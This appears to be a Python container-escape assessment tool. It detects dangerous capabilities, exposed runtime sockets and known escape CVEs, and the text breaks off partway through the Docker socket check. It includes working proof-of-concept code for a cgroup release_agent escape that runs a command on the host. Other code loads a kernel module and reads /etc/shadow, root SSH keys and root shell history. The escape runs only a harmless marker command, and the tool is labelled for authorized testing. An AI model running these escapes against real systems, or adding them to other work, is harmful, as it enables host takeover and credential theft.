#!/usr/bin/env python3
"""
container_escape_tool.py - Comprehensive Container Escape Assessment Framework

A professional red-team tool for assessing container security posture,
detecting escape vectors, and optionally executing proof-of-concept exploits.

Categories covered:
  1.  Privileged container / capability abuse
  2.  Docker socket exposure
  3.  Dangerous Linux capabilities (SYS_ADMIN, SYS_MODULE, SYS_PTRACE, etc.)
  4.  cgroup release_agent escape
  5.  /proc & /sys abuse (core_pattern, sysrq, uevent_helper)
  6.  Host namespace sharing (PID, NET, MNT, UTS, IPC, USER)
  7.  Sensitive host mount detection
  8.  Device file access (/dev/sda, /dev/mem, etc.)
  9.  Kernel module loading
  10. AppArmor / SELinux / Seccomp status
  11. User namespace configuration
  12. Kubernetes service account & secrets
  13. Cloud metadata service access (AWS/GCP/Azure)
  14. Container runtime socket exposure
  15. Environment variable & credential leakage
  16. OverlayFS and filesystem exploits
  17. Network-based escapes (host network, ARP spoofing surface)
  18. CVE-based escape detection (runc, containerd, kernel)

Usage:
  python3 container_escape_tool.py                    # Interactive mode (default)
  python3 container_escape_tool.py --auto             # Auto-run all checks, prompt before PoCs
  python3 container_escape_tool.py --scan-only        # Detection only, no PoC prompts
  python3 container_escape_tool.py --no-sudo          # Skip sudo-based checks
  python3 container_escape_tool.py --output report    # Save report to file

Author: Security Assessment Framework
License: For authorized security testing only.
"""
from __future__ import annotations

import argparse
import glob
import json
import os
import platform
import re
import shlex
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import textwrap
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple


# ─── Constants ────────────────────────────────────────────────────────────────

VERSION = "2.0.0"

class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH     = "HIGH"
    MEDIUM   = "MEDIUM"
    LOW      = "LOW"
    INFO     = "INFO"

SEVERITY_COLORS = {
    Severity.CRITICAL: "\033[91m",  # bright red
    Severity.HIGH:     "\033[31m",  # red
    Severity.MEDIUM:   "\033[33m",  # yellow
    Severity.LOW:      "\033[36m",  # cyan
    Severity.INFO:     "\033[37m",  # white
}
RESET  = "\033[0m"
BOLD   = "\033[1m"
GREEN  = "\033[92m"
YELLOW = "\033[33m"
RED    = "\033[91m"
CYAN   = "\033[96m"
DIM    = "\033[2m"

# Linux capability bit positions
CAP_BITS = {
    "CAP_CHOWN": 0, "CAP_DAC_OVERRIDE": 1, "CAP_DAC_READ_SEARCH": 2,
    "CAP_FOWNER": 3, "CAP_FSETID": 4, "CAP_KILL": 5, "CAP_SETGID": 6,
    "CAP_SETUID": 7, "CAP_SETPCAP": 8, "CAP_LINUX_IMMUTABLE": 9,
    "CAP_NET_BIND_SERVICE": 10, "CAP_NET_BROADCAST": 11, "CAP_NET_ADMIN": 12,
    "CAP_NET_RAW": 13, "CAP_IPC_LOCK": 14, "CAP_IPC_OWNER": 15,
    "CAP_SYS_MODULE": 16, "CAP_SYS_RAWIO": 17, "CAP_SYS_CHROOT": 18,
    "CAP_SYS_PTRACE": 19, "CAP_SYS_PACCT": 20, "CAP_SYS_ADMIN": 21,
    "CAP_SYS_BOOT": 22, "CAP_SYS_NICE": 23, "CAP_SYS_RESOURCE": 24,
    "CAP_SYS_TIME": 25, "CAP_SYS_TTY_CONFIG": 26, "CAP_MKNOD": 27,
    "CAP_LEASE": 28, "CAP_AUDIT_WRITE": 29, "CAP_AUDIT_CONTROL": 30,
    "CAP_SETFCAP": 31, "CAP_MAC_OVERRIDE": 32, "CAP_MAC_ADMIN": 33,
    "CAP_SYSLOG": 34, "CAP_WAKE_ALARM": 35, "CAP_BLOCK_SUSPEND": 36,
    "CAP_AUDIT_READ": 37, "CAP_PERFMON": 38, "CAP_BPF": 39,
    "CAP_CHECKPOINT_RESTORE": 40,
}

# Capabilities that enable escape or significant host impact
DANGEROUS_CAPS = {
    "CAP_SYS_ADMIN":       "Mount filesystems, trace, BPF, namespace manipulation, cgroup escape",
    "CAP_SYS_MODULE":      "Load/unload kernel modules - direct kernel code execution",
    "CAP_SYS_PTRACE":      "Trace any process - inject code into host processes if PID ns shared",
    "CAP_SYS_RAWIO":       "Raw I/O access - read/write physical memory and I/O ports",
    "CAP_NET_ADMIN":       "Network configuration - ARP spoofing, interface manipulation",
    "CAP_NET_RAW":         "Raw sockets - packet sniffing and injection",
    "CAP_DAC_READ_SEARCH": "Bypass file read permission checks - read any file",
    "CAP_DAC_OVERRIDE":    "Bypass file read/write/execute permission checks",
    "CAP_BPF":             "BPF operations - kernel tracing and packet filtering",
    "CAP_PERFMON":         "Performance monitoring - kernel memory reads via perf",
    "CAP_SETUID":          "Set UID - privilege escalation within container",
    "CAP_SETGID":          "Set GID - privilege escalation within container",
    "CAP_MKNOD":           "Create device files - potential device access",
    "CAP_CHECKPOINT_RESTORE": "Checkpoint/restore - namespace manipulation",
    "CAP_AUDIT_CONTROL":   "Audit system control - disable logging",
}

# Container runtime sockets to check
RUNTIME_SOCKETS = [
    "/var/run/docker.sock",
    "/run/docker.sock",
    "/var/run/dockershim.sock",
    "/run/containerd/containerd.sock",
    "/run/crio/crio.sock",
    "/run/podman/podman.sock",
    "/var/run/cri-dockerd.sock",
    "/var/lib/lxd/unix.socket",
]

# Sensitive host paths that indicate host mounts
SENSITIVE_HOST_MOUNTS = [
    "/etc/shadow", "/etc/passwd", "/etc/hostname", "/etc/resolv.conf",
    "/root", "/home", "/var/log", "/var/run", "/var/lib/docker",
    "/var/lib/kubelet", "/etc/kubernetes",
]

# Cloud metadata endpoints
METADATA_ENDPOINTS = {
    "AWS":   ("169.254.169.254", 80, "http://169.254.169.254/latest/meta-data/"),
    "GCP":   ("169.254.169.254", 80, "http://metadata.google.internal/computeMetadata/v1/"),
    "Azure": ("169.254.169.254", 80, "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
}

# Known CVEs for container escapes
KNOWN_ESCAPE_CVES = {
    "CVE-2019-5736": {
        "component": "runc",
        "description": "runc container escape via /proc/self/exe overwrite",
        "affected": "runc < 1.0.0-rc6",
        "severity": Severity.CRITICAL,
    },
    "CVE-2020-15257": {
        "component": "containerd",
        "description": "containerd-shim API exposed to containers via abstract unix sockets",
        "affected": "containerd < 1.3.9, < 1.4.3",
        "severity": Severity.HIGH,
    },
    "CVE-2021-41091": {
        "component": "moby/docker",
        "description": "Moby data directory traversal - unprivileged user access to host files",
        "affected": "Docker Engine < 20.10.9",
        "severity": Severity.HIGH,
    },
    "CVE-2022-0185": {
        "component": "kernel",
        "description": "Linux kernel heap overflow in legacy_parse_param (fsconfig)",
        "affected": "kernel 5.1 - 5.16.2",
        "severity": Severity.CRITICAL,
    },
    "CVE-2022-0847": {
        "component": "kernel",
        "description": "Dirty Pipe - arbitrary file overwrite via splice",
        "affected": "kernel 5.8 - 5.16.11, 5.15.25, 5.10.102",
        "severity": Severity.CRITICAL,
    },
    "CVE-2024-21626": {
        "component": "runc",
        "description": "runc process.cwd container breakout via leaked fd to host filesystem",
        "affected": "runc < 1.1.12",
        "severity": Severity.CRITICAL,
    },
    "CVE-2023-0386": {
        "component": "kernel",
        "description": "OverlayFS setuid file copy-up privilege escalation",
        "affected": "kernel < 6.2",
        "severity": Severity.HIGH,
    },
    "CVE-2023-32233": {
        "component": "kernel",
        "description": "Netfilter nf_tables use-after-free privilege escalation",
        "affected": "kernel < 6.4",
        "severity": Severity.HIGH,
    },
    "CVE-2020-8558": {
        "component": "kubernetes",
        "description": "kube-proxy allows localhost service access from adjacent hosts",
        "affected": "k8s < 1.16.11, 1.17.7, 1.18.4",
        "severity": Severity.MEDIUM,
    },
}


# ─── Data Structures ─────────────────────────────────────────────────────────

@dataclass
class CmdResult:
    cmd: str
    rc: int
    out: str
    err: str


@dataclass
class Finding:
    category: str
    title: str
    severity: Severity
    detail: str
    evidence: str = ""
    poc_available: bool = False
    poc_description: str = ""
    poc_func: Optional[Callable] = None
    remediation: str = ""


@dataclass
class AssessmentContext:
    """Shared state across all check modules."""
    is_root: bool = False
    sudo_available: bool = False
    sudo_passwordless: bool = False
    in_container: bool = False
    container_runtime: str = "unknown"
    cap_eff_hex: str = ""
    cap_eff_val: int = 0
    cap_names: List[str] = field(default_factory=list)
    dangerous_caps: List[str] = field(default_factory=list)
    seccomp_mode: int = -1
    apparmor_profile: str = ""
    selinux_mode: str = ""
    userns_active: bool = False
    kernel_version: str = ""
    kernel_release: str = ""
    uid_map_text: str = ""
    cgroup_text: str = ""
    mounts_text: str = ""
    docker_sock_path: Optional[str] = None
    has_docker_cli: bool = False
    k8s_in_cluster: bool = False
    findings: List[Finding] = field(default_factory=list)
    report_lines: List[str] = field(default_factory=list)
    args: Any = None


# ─── Utility Functions ────────────────────────────────────────────────────────

def run_cmd(cmd: str, timeout: int = 8, shell: bool = False) -> CmdResult:
    """Run a command safely and return structured result."""
    try:
        if shell:
            p = subprocess.run(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                timeout=timeout, text=True, check=False, shell=True,
            )
        else:
            parts = shlex.split(cmd)
            p = subprocess.run(
                parts, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                timeout=timeout, text=True, check=False,
            )
        return CmdResult(cmd=cmd, rc=p.returncode, out=p.stdout.strip(), err=p.stderr.strip())
    except FileNotFoundError as e:
        return CmdResult(cmd=cmd, rc=127, out="", err=str(e))
    except subprocess.TimeoutExpired:
        return CmdResult(cmd=cmd, rc=124, out="", err="timeout")
    except Exception as e:
        return CmdResult(cmd=cmd, rc=-1, out="", err=str(e))


def read_file(path: str, max_bytes: int = 65536) -> str:
    """Read a file safely, returning content or error string."""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return f.read(max_bytes).strip()
    except PermissionError:
        return f"<permission denied: {path}>"
    except FileNotFoundError:
        return ""
    except Exception as e:
        return f"<error: {e}>"


def file_exists(path: str) -> bool:
    try:
        os.lstat(path)
        return True
    except:
        return False


def file_accessible(path: str, mode: int = os.R_OK) -> bool:
    return os.access(path, mode)


def tcp_connect(host: str, port: int, timeout: float = 2.0) -> bool:
    """Test TCP connectivity."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return True
    except:
        return False


def http_get(url: str, headers: Optional[Dict[str, str]] = None,
             timeout: float = 3.0) -> Tuple[int, str]:
    """Minimal HTTP GET using subprocess curl or python."""
    cmd_parts = ["curl", "-s", "-o", "-", "-w", "\n%{http_code}",
                 "--connect-timeout", str(int(timeout)), "--max-time", str(int(timeout + 2))]
    if headers:
        for k, v in headers.items():
            cmd_parts.extend(["-H", f"{k}: {v}"])
    cmd_parts.append(url)
    try:
        p = subprocess.run(cmd_parts, capture_output=True, text=True, timeout=timeout + 4)
        lines = p.stdout.strip().rsplit("\n", 1)
        if len(lines) == 2:
            body, code = lines
            return int(code), body
        return 0, p.stdout
    except:
        return 0, ""


def parse_cap_eff(cap_hex: str) -> Tuple[int, List[str]]:
    """Parse Linux capability effective bitmask."""
    cap_hex = cap_hex.strip().lower().replace("0x", "")
    if not cap_hex:
        return 0, []
    try:
        val = int(cap_hex, 16)
    except ValueError:
        return 0, []
    present = [name for name, bit in CAP_BITS.items() if val & (1 << bit)]
    return val, present


def parse_kernel_version(release: str) -> Tuple[int, int, int]:
    """Extract major.minor.patch from kernel release string."""
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", release)
    if m:
        return int(m.group(1)), int(m.group(2)), int(m.group(3))
    return 0, 0, 0


def kernel_version_lt(release: str, major: int, minor: int, patch: int) -> bool:
    """Check if kernel version is less than specified."""
    kv = parse_kernel_version(release)
    return kv < (major, minor, patch)


def kernel_version_between(release: str, lo: Tuple[int,int,int], hi: Tuple[int,int,int]) -> bool:
    kv = parse_kernel_version(release)
    return lo <= kv <= hi


# ─── Display Helpers ──────────────────────────────────────────────────────────

def banner():
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════════╗
║  {BOLD}Container Escape Assessment Framework v{VERSION}{RESET}{RED}                   ║
║  Comprehensive Container Security & Escape Vector Analysis       ║
║  {DIM}For authorized security testing only{RESET}{RED}                             ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
""")


def section_header(title: str, icon: str = "═"):
    width = 66
    print(f"\n{CYAN}{BOLD}{'─' * width}{RESET}")
    print(f"{CYAN}{BOLD}  {title}{RESET}")
    print(f"{CYAN}{'─' * width}{RESET}")


def subsection(title: str):
    print(f"\n  {BOLD}{title}{RESET}")


def print_finding(f: Finding, index: int = 0):
    color = SEVERITY_COLORS.get(f.severity, RESET)
    poc_tag = f" {YELLOW}[PoC Available]{RESET}" if f.poc_available else ""
    print(f"  {color}[{f.severity.value}]{RESET} {f.title}{poc_tag}")
    if f.detail:
        for line in textwrap.wrap(f.detail, width=72):
            print(f"         {DIM}{line}{RESET}")
    if f.evidence:
        for line in f.evidence.splitlines()[:5]:
            print(f"         {DIM}> {line.strip()[:100]}{RESET}")


def prompt_user(question: str, default: str = "n") -> bool:
    """Interactive yes/no prompt."""
    suffix = " [Y/n]: " if default.lower() == "y" else " [y/N]: "
    try:
        resp = input(f"\n  {YELLOW}▶ {question}{suffix}{RESET}").strip().lower()
        if not resp:
            return default.lower() == "y"
        return resp in ("y", "yes")
    except (EOFError, KeyboardInterrupt):
        print()
        return False


def prompt_select(question: str, options: List[str]) -> int:
    """Interactive selection prompt. Returns index or -1."""
    print(f"\n  {YELLOW}▶ {question}{RESET}")
    for i, opt in enumerate(options, 1):
        print(f"    {i}. {opt}")
    print(f"    0. Skip")
    try:
        resp = input(f"  {YELLOW}  Choice: {RESET}").strip()
        val = int(resp)
        if 0 <= val <= len(options):
            return val - 1  # -1 for skip
        return -1
    except (ValueError, EOFError, KeyboardInterrupt):
        print()
        return -1


def log_report(ctx: AssessmentContext, line: str):
    ctx.report_lines.append(line)


# ─── Context Initialization ──────────────────────────────────────────────────

def init_context(args) -> AssessmentContext:
    """Gather baseline system information."""
    ctx = AssessmentContext(args=args)

    # Identity
    ctx.is_root = os.geteuid() == 0
    ctx.sudo_available = shutil.which("sudo") is not None
    if ctx.sudo_available and not args.no_sudo:
        r = run_cmd("sudo -n id", timeout=4)
        ctx.sudo_passwordless = r.rc == 0 and "uid=0" in r.out

    # Kernel
    ctx.kernel_release = platform.release()
    ctx.kernel_version = platform.version()

    # Capabilities
    status = read_file("/proc/self/status")
    m = re.search(r"^CapEff:\s*([0-9a-fA-F]+)\s*$", status, flags=re.M)
    if m:
        ctx.cap_eff_hex = m.group(1)
        ctx.cap_eff_val, ctx.cap_names = parse_cap_eff(ctx.cap_eff_hex)
        ctx.dangerous_caps = [c for c in DANGEROUS_CAPS if c in ctx.cap_names]

    # Seccomp
    sm = re.search(r"^Seccomp:\s*(\d+)\s*$", status, flags=re.M)
    ctx.seccomp_mode = int(sm.group(1)) if sm else -1

    # AppArmor
    aa = read_file("/proc/self/attr/current")
    ctx.apparmor_profile = aa if aa and not aa.startswith("<") else ""

    # SELinux
    se = read_file("/proc/self/attr/current")
    if "selinux" in read_file("/proc/filesystems").lower() or file_exists("/sys/fs/selinux"):
        r = run_cmd("getenforce", timeout=3)
        ctx.selinux_mode = r.out if r.rc == 0 else ""

    # User namespace
    ctx.uid_map_text = read_file("/proc/self/uid_map")
    for line in ctx.uid_map_text.splitlines():
        parts = line.split()
        if len(parts) == 3 and parts[0] == "0" and parts[1] != "0":
            ctx.userns_active = True
            break

    # Container detection
    ctx.cgroup_text = read_file("/proc/1/cgroup")
    ctx.mounts_text = read_file("/proc/self/mountinfo") or read_file("/proc/mounts")

    container_hints = [
        file_exists("/.dockerenv"),
        file_exists("/run/.containerenv"),
        "docker" in ctx.cgroup_text.lower(),
        "kubepods" in ctx.cgroup_text.lower(),
        "containerd" in ctx.cgroup_text.lower(),
        "lxc" in ctx.cgroup_text.lower(),
    ]
    ctx.in_container = any(container_hints)

    if file_exists("/.dockerenv") or "docker" in ctx.cgroup_text.lower():
        ctx.container_runtime = "docker"
    elif "kubepods" in ctx.cgroup_text.lower():
        ctx.container_runtime = "kubernetes"
    elif file_exists("/run/.containerenv"):
        ctx.container_runtime = "podman"
    elif "lxc" in ctx.cgroup_text.lower():
        ctx.container_runtime = "lxc"
    else:
        ctx.container_runtime = "unknown"

    # Docker socket
    for sock in RUNTIME_SOCKETS:
        if file_exists(sock) and "docker" in sock:
            ctx.docker_sock_path = sock
            break

    ctx.has_docker_cli = shutil.which("docker") is not None

    # Kubernetes
    ctx.k8s_in_cluster = (
        os.environ.get("KUBERNETES_SERVICE_HOST") is not None
        or file_exists("/var/run/secrets/kubernetes.io/serviceaccount/token")
    )

    return ctx


# ─── CHECK MODULES ────────────────────────────────────────────────────────────
# Each module: check_*(ctx) -> List[Finding]
# Each PoC:    poc_*(ctx) -> bool (success)

# ═══════════════════════════════════════════════════════════════════════════════
# 1. CONTAINER DETECTION & BASIC INFO
# ═══════════════════════════════════════════════════════════════════════════════

def check_container_info(ctx: AssessmentContext) -> List[Finding]:
    """Basic container detection and environment info."""
    findings = []

    if not ctx.in_container:
        findings.append(Finding(
            category="Environment",
            title="Not running inside a detected container",
            severity=Severity.INFO,
            detail="No container indicators found. Tool may still find useful security info.",
        ))
    else:
        findings.append(Finding(
            category="Environment",
            title=f"Container detected (runtime: {ctx.container_runtime})",
            severity=Severity.INFO,
            detail=f"Indicators: /.dockerenv={file_exists('/.dockerenv')}, "
                   f"/run/.containerenv={file_exists('/run/.containerenv')}",
            evidence="\n".join(ctx.cgroup_text.splitlines()[:5]),
        ))

    if ctx.is_root:
        findings.append(Finding(
            category="Environment",
            title="Running as root (UID 0) inside container",
            severity=Severity.HIGH,
            detail="Root inside a container significantly increases escape surface area.",
        ))

    if ctx.sudo_passwordless:
        findings.append(Finding(
            category="Environment",
            title="Passwordless sudo to root available",
            severity=Severity.HIGH,
            detail="sudo -n can escalate to root without password, equivalent to root access.",
        ))

    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# 2. CAPABILITY ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════════

def check_capabilities(ctx: AssessmentContext) -> List[Finding]:
    """Analyze effective Linux capabilities for escape vectors."""
    findings = []

    if not ctx.cap_eff_hex:
        findings.append(Finding(
            category="Capabilities",
            title="Unable to read effective capabilities",
            severity=Severity.INFO,
            detail="Could not parse CapEff from /proc/self/status",
        ))
        return findings

    # Check for full capabilities (privileged container)
    all_caps_mask = sum(1 << bit for bit in CAP_BITS.values())
    if ctx.cap_eff_val == all_caps_mask or ctx.cap_eff_val >= (1 << 38) - 1:
        findings.append(Finding(
            category="Capabilities",
            title="PRIVILEGED CONTAINER - All capabilities granted",
            severity=Severity.CRITICAL,
            detail="This container has all Linux capabilities. Combined with other conditions, "
                   "multiple escape paths are likely available.",
            evidence=f"CapEff: 0x{ctx.cap_eff_hex}",
            remediation="Run container without --privileged flag. Grant only needed capabilities.",
        ))

    for cap_name in ctx.dangerous_caps:
        desc = DANGEROUS_CAPS.get(cap_name, "")
        sev = Severity.CRITICAL if cap_name in ("CAP_SYS_ADMIN", "CAP_SYS_MODULE", "CAP_SYS_PTRACE") \
              else Severity.HIGH

        poc_func = None
        poc_desc = ""
        if cap_name == "CAP_SYS_ADMIN":
            poc_func = poc_cap_sys_admin
            poc_desc = "Attempt cgroup release_agent escape or mount host filesystem"
        elif cap_name == "CAP_SYS_MODULE":
            poc_func = poc_cap_sys_module
            poc_desc = "Demonstrate kernel module loading capability"
        elif cap_name == "CAP_SYS_PTRACE":
            poc_func = poc_cap_sys_ptrace
            poc_desc = "Enumerate host processes visible for injection"
        elif cap_name == "CAP_DAC_READ_SEARCH":
            poc_func = poc_cap_dac_read_search
            poc_desc = "Read sensitive host files (e.g., /etc/shadow via open_by_handle_at)"

        findings.append(Finding(
            category="Capabilities",
            title=f"Dangerous capability: {cap_name}",
            severity=sev,
            detail=desc,
            evidence=f"Bit position: {CAP_BITS.get(cap_name, '?')}",
            poc_available=poc_func is not None,
            poc_description=poc_desc,
            poc_func=poc_func,
            remediation=f"Remove {cap_name} from container capabilities. Use --cap-drop={cap_name}",
        ))

    return findings


def poc_cap_sys_admin(ctx: AssessmentContext) -> bool:
    """PoC: CAP_SYS_ADMIN - Attempt cgroup release_agent escape."""
    print(f"\n    {BOLD}PoC: CAP_SYS_ADMIN - cgroup release_agent escape{RESET}")
    print(f"    {DIM}This will attempt to create a cgroup and write a benign command{RESET}")
    print(f"    {DIM}to release_agent to demonstrate host code execution.{RESET}\n")

    if not ctx.is_root and not ctx.sudo_passwordless:
        print(f"    {RED}✗ Need root or passwordless sudo for this PoC{RESET}")
        return False

    prefix = "sudo -n " if not ctx.is_root else ""
    marker = f"/tmp/container_escape_poc_{int(time.time())}"

    # Step 1: Find cgroup mount
    print(f"    [1/5] Locating writable cgroup mount...")
    cgroup_base = None
    for line in ctx.mounts_text.splitlines():
        if "cgroup" in line and ("memory" in line or "rdma" in line or "cpuset" in line):
            parts = line.split()
            for i, p in enumerate(parts):
                if p.startswith("/sys/fs/cgroup"):
                    cgroup_base = p
                    break
            if cgroup_base:
                break

    if not cgroup_base:
        # Try to mount a cgroup
        cgroup_base = "/tmp/cgrp_poc"
        r = run_cmd(f"{prefix}mkdir -p {cgroup_base}")
        r = run_cmd(f"{prefix}mount -t cgroup -o rdma cgroup {cgroup_base}")
        if r.rc != 0:
            r = run_cmd(f"{prefix}mount -t cgroup -o memory cgroup {cgroup_base}")
        if r.rc != 0:
            print(f"    {RED}✗ Cannot mount cgroup filesystem{RESET}")
            print(f"    {DIM}  Error: {r.err}{RESET}")
            return False

    print(f"    {GREEN}✓ Found cgroup mount: {cgroup_base}{RESET}")

    # Step 2: Create child cgroup
    poc_cgroup = f"{cgroup_base}/escape_poc_{os.getpid()}"
    print(f"    [2/5] Creating child cgroup: {poc_cgroup}")
    r = run_cmd(f"{prefix}mkdir -p {poc_cgroup}")
    if r.rc != 0:
        print(f"    {RED}✗ Cannot create child cgroup{RESET}")
        return False

    # Step 3: Enable release_agent
    print(f"    [3/5] Checking release_agent writability...")
    release_agent = f"{cgroup_base}/release_agent"
    notify_on_release = f"{poc_cgroup}/notify_on_release"

    # Write a benign marker command
    host_cmd = f"#!/bin/sh\ntouch {marker}\nid > {marker}.info\nhostname >> {marker}.info\n"
    cmd_path = "/cmd_poc.sh"

    r = run_cmd(f"{prefix}sh -c 'echo \"{host_cmd}\" > {cmd_path}'", shell=True)
    r2 = run_cmd(f"{prefix}chmod +x {cmd_path}")

    # Try to set release_agent
    r = run_cmd(f"{prefix}sh -c 'echo {cmd_path} > {release_agent}'", shell=True)
    if r.rc != 0:
        print(f"    {YELLOW}⚠ Cannot write release_agent (may be in cgroup v2 or read-only){RESET}")
        print(f"    {DIM}  Error: {r.err}{RESET}")
        # Cleanup
        run_cmd(f"{prefix}rmdir {poc_cgroup} 2>/dev/null", shell=True)
        return False

    print(f"    {GREEN}✓ release_agent writable{RESET}")

    # Step 4: Set notify_on_release
    print(f"    [4/5] Enabling notify_on_release...")
    r = run_cmd(f"{prefix}sh -c 'echo 1 > {notify_on_release}'", shell=True)
    if r.rc != 0:
        print(f"    {RED}✗ Cannot set notify_on_release{RESET}")
        run_cmd(f"{prefix}rmdir {poc_cgroup} 2>/dev/null", shell=True)
        return False

    # Step 5: Trigger by writing shell PID and removing it
    print(f"    [5/5] Triggering release_agent execution...")
    r = run_cmd(f"{prefix}sh -c 'echo $$ > {poc_cgroup}/cgroup.procs && sleep 0.1'", shell=True)
    # The cgroup needs to become empty to trigger
    run_cmd(f"{prefix}sh -c 'echo 0 > {poc_cgroup}/cgroup.procs'", shell=True)
    time.sleep(1)

    # Check if marker file was created
    if file_exists(marker):
        info = read_file(f"{marker}.info")
        print(f"\n    {RED}{BOLD}★ SUCCESS - Code executed on host!{RESET}")
        print(f"    {RED}  Marker file created at: {marker}{RESET}")
        if info:
            print(f"    {RED}  Host info: {info}{RESET}")
        # Cleanup
        run_cmd(f"{prefix}rm -f {marker} {marker}.info {cmd_path}")
        run_cmd(f"{prefix}rmdir {poc_cgroup} 2>/dev/null", shell=True)
        return True
    else:
        print(f"    {YELLOW}⚠ release_agent was set but trigger may not have fired{RESET}")
        print(f"    {DIM}  This can happen with cgroup v2 or if mount is namespaced{RESET}")
        # Cleanup
        run_cmd(f"{prefix}rm -f {cmd_path}")
        run_cmd(f"{prefix}rmdir {poc_cgroup} 2>/dev/null", shell=True)
        return False


def poc_cap_sys_module(ctx: AssessmentContext) -> bool:
    """PoC: CAP_SYS_MODULE - Check if kernel modules can be loaded."""
    print(f"\n    {BOLD}PoC: CAP_SYS_MODULE - Kernel module loading test{RESET}")
    print(f"    {DIM}This will check if finit_module/init_module syscalls are available{RESET}")
    print(f"    {DIM}and attempt to load a benign existing module.{RESET}\n")

    prefix = "sudo -n " if not ctx.is_root and ctx.sudo_passwordless else ""
    if not ctx.is_root and not ctx.sudo_passwordless:
        print(f"    {RED}✗ Need root for module loading{RESET}")
        return False

    # List loaded modules
    r = run_cmd(f"{prefix}lsmod")
    if r.rc == 0:
        mod_count = len(r.out.splitlines()) - 1
        print(f"    {GREEN}✓ lsmod accessible: {mod_count} modules loaded{RESET}")
    else:
        print(f"    {YELLOW}⚠ lsmod not available or blocked{RESET}")

    # Try to list available modules
    r = run_cmd(f"{prefix}find /lib/modules/ -name '*.ko' -type f 2>/dev/null | head -5", shell=True)
    if r.rc == 0 and r.out:
        print(f"    {GREEN}✓ Kernel modules directory accessible{RESET}")
        print(f"    {DIM}  Sample modules:{RESET}")
        for line in r.out.splitlines()[:3]:
            print(f"    {DIM}    {line}{RESET}")
    else:
        print(f"    {YELLOW}⚠ /lib/modules not accessible{RESET}")

    # Try to insert a harmless module (dummy_hcd or loop)
    test_mod = "loop"
    r = run_cmd(f"{prefix}modprobe -n {test_mod}")  # dry-run
    if r.rc == 0:
        print(f"\n    {RED}{BOLD}★ modprobe dry-run succeeded - module loading likely possible!{RESET}")
        print(f"    {RED}  A malicious kernel module could provide full host access.{RESET}")

        if prompt_user("Actually load test module (loop) to confirm? (will unload after)"):
            r = run_cmd(f"{prefix}modprobe {test_mod}")
            if r.rc == 0:
                print(f"    {RED}{BOLD}★ Module loaded successfully!{RESET}")
                run_cmd(f"{prefix}modprobe -r {test_mod}")
                return True
            else:
                print(f"    {YELLOW}⚠ modprobe failed: {r.err}{RESET}")
                return False
        return True  # dry-run success counts
    else:
        print(f"    {YELLOW}⚠ modprobe dry-run failed: {r.err}{RESET}")
        return False


def poc_cap_sys_ptrace(ctx: AssessmentContext) -> bool:
    """PoC: CAP_SYS_PTRACE - Enumerate processes available for injection."""
    print(f"\n    {BOLD}PoC: CAP_SYS_PTRACE - Process enumeration for injection{RESET}")
    print(f"    {DIM}Checking if host processes are visible and traceable.{RESET}\n")

    # Check if /proc shows host processes
    r = run_cmd("ls -la /proc/1/exe")
    init_visible = r.rc == 0
    print(f"    /proc/1/exe readable: {'✓ YES' if init_visible else '✗ No'}")

    # Try to read /proc/1/root
    r = run_cmd("ls /proc/1/root/")
    if r.rc == 0:
        print(f"    {RED}{BOLD}★ /proc/1/root readable - host filesystem accessible!{RESET}")
        print(f"    {DIM}  Contents: {r.out[:200]}{RESET}")
        return True

    # Enumerate interesting processes
    interesting = []
    try:
        for pid_dir in os.listdir("/proc"):
            if not pid_dir.isdigit():
                continue
            pid = int(pid_dir)
            try:
                cmdline = read_file(f"/proc/{pid}/cmdline").replace("\x00", " ").strip()
                status_text = read_file(f"/proc/{pid}/status")
                if cmdline and any(kw in cmdline.lower() for kw in
                    ["dockerd", "containerd", "kubelet", "sshd", "systemd", "cron"]):
                    interesting.append((pid, cmdline[:80]))
            except:
                continue
    except:
        pass

    if interesting:
        print(f"\n    {RED}Interesting host processes visible ({len(interesting)}):{RESET}")
        for pid, cmd in interesting[:10]:
            print(f"      PID {pid}: {cmd}")
        print(f"\n    {YELLOW}With CAP_SYS_PTRACE, these processes can potentially be injected.{RESET}")
        return True
    else:
        print(f"    {GREEN}No obviously interesting host processes visible.{RESET}")
        return False


def poc_cap_dac_read_search(ctx: AssessmentContext) -> bool:
    """PoC: CAP_DAC_READ_SEARCH - Read host files via open_by_handle_at."""
    print(f"\n    {BOLD}PoC: CAP_DAC_READ_SEARCH - Shocker-style file read{RESET}")
    print(f"    {DIM}This capability allows bypassing file read permission checks.{RESET}")
    print(f"    {DIM}Can be used with open_by_handle_at() to read arbitrary host files.{RESET}\n")

    # Simple check: can we read files we shouldn't?
    test_files = ["/etc/shadow", "/root/.bash_history", "/root/.ssh/id_rsa"]
    readable = []
    for tf in test_files:
        if file_accessible(tf, os.R_OK):
            content = read_file(tf)
            if content and not content.startswith("<"):
                readable.append(tf)

    if readable:
        print(f"    {RED}{BOLD}★ Can read normally-protected files:{RESET}")
        for f in readable:
            print(f"      {f}")
        return True

    # Check if we can compile the shocker exploit
    if shutil.which("gcc"):
        print(f"    {YELLOW}gcc available - open_by_handle_at exploit could be compiled{RESET}")
        print(f"    {DIM}  The 'shocker' exploit uses this cap to read host files via file handle brute-force{RESET}")
        return True
    else:
        print(f"    {YELLOW}⚠ gcc not available for shocker compile, but capability is present{RESET}")
        return False


# ═══════════════════════════════════════════════════════════════════════════════
# 3. DOCKER SOCKET ESCAPE
# ═══════════════════════════════════════════════════════════════════════════════

def check_docker_socket(ctx: AssessmentContext) -> List[Finding]:
    """Check for exposed Docker socket."""
    findings = []

    for sock_path in RUNTIME_SOCKETS:
        if not file_exists(sock_path):
            continue

        readable = file_accessible(sock_path, os.R_OK)
        writable = file_accessible(sock_path, os.W_OK)

        if "docker" in sock_path:
            if writable:
                findings.append(Finding(
                    category="Docker Socket",
                    title=f"Docker socket writable: {sock_path}",
                    severity=Severity.CRITICAL,
